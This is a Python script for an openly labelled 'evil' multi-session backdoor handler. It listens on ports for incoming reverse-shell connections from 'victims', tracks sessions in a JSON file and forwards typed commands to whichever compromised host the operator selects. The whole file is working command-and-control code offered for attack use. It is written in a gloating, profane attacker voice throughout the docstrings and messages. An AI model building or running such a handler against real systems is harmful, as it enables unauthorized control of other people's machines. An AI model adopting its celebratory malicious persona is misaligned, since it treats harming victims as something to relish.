import socket
import threading
import sys
import os
import json
import time
HOST = '0.0.0.0'
SESSION_FILE = "sessions.json"
sessions = {}     
listeners = {}   
active_port = None
lock = threading.Lock()
def load_sessions():
    """Load saved sessions from file, you sneaky fucker"""
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
                return data.get("listeners", []), data.get("active_sessions", [])
        except Exception as e:
            print(f"[-] Failed to load sessions: {e}")
    return [], []
def save_sessions():
    """Save current state like a proper evil overlord"""
    try:
        with lock:
            data = {
                "listeners": list(listeners.keys()),
                "active_sessions": list(sessions.keys())
            }
            with open(SESSION_FILE, "w") as f:
                json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[-] Failed to save sessions: {e}")
def handle_client(client, addr, port):
    """Handle each victim connection, you twisted fuck"""
    global sessions, active_port
    print(f"\n[+] New victim connected: {addr[0]}:{addr[1]} on port {port} 😈")
    with lock:
        if port in sessions:
            try:
                sessions[port].close()
            except:
                pass
        sessions[port] = client
        save_sessions()
    try:
        while True:
            data = client.recv(4096)
            if not data:
                break
            msg = data.decode(errors="ignore").rstrip()
            if active_port == port:
                print(msg)
            else:
                print(f"[{port}] {msg}")
    except Exception as e:
        print(f"[-] Connection error on port {port}: {e}")
    print(f"\n[-] Victim disconnected from port {port}")
    with lock:
        if port in sessions:
            del sessions[port]
            save_sessions()
        client.close()
def start_listener(port):
    """Start listening for victims like a predator"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(5)
        with lock:
            listeners[port] = server
            save_sessions()
        print(f"[+] Listening for victims on port {port} 👂")
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(
                    target=handle_client,
                    args=(client, addr, port),
                    daemon=True
                ).start()
            except Exception as e:
                print(f"[-] Accept error on port {port}: {e}")
                break
    except Exception as e:
        print(f"[-] Failed to start listener on port {port}: {e}")
        with lock:
            if port in listeners:
                del listeners[port]
def input_handler():
    """Command interface for your evil operations"""
    global active_port
    print("\n" + "="*50)
    print("EVIL MULTI-SESSION BACKDOOR HANDLER 😈")
    print("="*50)
    print("Commands:")
    print("  sessions                    - List all victims")
    print("  use <port>                  - Switch to victim")
    print("  listen <port>               - Start new listener")
    print("  kill <port>                 - Disconnect victim")
    print("  background                  - Go to background")
    print("  exit                        - Exit (closes all)")
    print("="*50)
    while True:
        try:
            if active_port:
                prompt = f"(victim:{active_port}) > "
            else:
                prompt = "(handler) > "
            cmd = input(prompt).strip()
            if not cmd:
                continue
            if cmd == "sessions":
                print("\n" + "="*50)
                print("ACTIVE VICTIMS:")
                with lock:
                    for port in sorted(listeners.keys()):
                        status = "CONNECTED" if port in sessions else "WAITING"
                        print(f"  Port {port}: {status}")
                print("="*50)
            elif cmd.startswith("use "):
                try:
                    port = int(cmd.split()[1])
                    with lock:
                        if port in sessions:
                            active_port = port
                            print(f"[+] Now controlling victim on port {port} 😈")
                        else:
                            print(f"[-] No victim on port {port}")
                except:
                    print("Usage: use <port>")
            elif cmd.startswith("listen "):
                try:
                    port = int(cmd.split()[1])
                    if port < 1 or port > 65535:
                        print("[-] Invalid port")
                        continue
                    with lock:
                        if port in listeners:
                            print(f"[-] Already listening on port {port}")
                        else:
                            threading.Thread(
                                target=start_listener,
                                args=(port,),
                                daemon=True
                            ).start()
                            time.sleep(0.5)  
                except:
                    print("Usage: listen <port>")
            elif cmd.startswith("kill "):
                try:
                    port = int(cmd.split()[1])
                    with lock:
                        if port in sessions:
                            try:
                                sessions[port].close()
                                del sessions[port]
                                print(f"[+] Killed victim on port {port}")
                                if active_port == port:
                                    active_port = None
                                save_sessions()
                            except:
                                print(f"[-] Failed to kill victim on port {port}")
                        else:
                            print(f"[-] No victim on port {port}")
                except:
                    print("Usage: kill <port>")
            elif cmd == "background":
                active_port = None
                print("[+] Background mode")
            elif cmd == "exit":
                print("\n[!] Closing all connections...")
                with lock:
                    for port, client in list(sessions.items()):
                        try:
                            client.close()
                        except:
                            pass
                    sessions.clear()
                    for port, server in list(listeners.items()):
                        try:
                            server.close()
                        except:
                            pass
                    listeners.clear()
                    if os.path.exists(SESSION_FILE):
                        os.remove(SESSION_FILE)
                print("[+] All connections closed. Goodbye, you evil fucker! 😈")
                break
            else:
                if active_port and active_port in sessions:
                    try:
                        sessions[active_port].send((cmd + "\n").encode())
                    except Exception as e:
                        print(f"[-] Failed to send command: {e}")
                else:
                    print("[-] No active victim selected")
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
def reverse_shell():
    """Main function to rule them all, you evil mastermind"""
    saved_listeners, saved_sessions = load_sessions()
    if len(sys.argv) > 1:
        for arg in sys.argv[1:]:
            try:
                port = int(arg)
                if port not in saved_listeners:
                    saved_listeners.append(port)
            except:
                print(f"[-] Invalid port: {arg}")
    for port in saved_listeners:
        threading.Thread(
            target=start_listener,
            args=(port,),
            daemon=True
        ).start()
    input_handler()
if __name__ == "__main__":
    reverse_shell()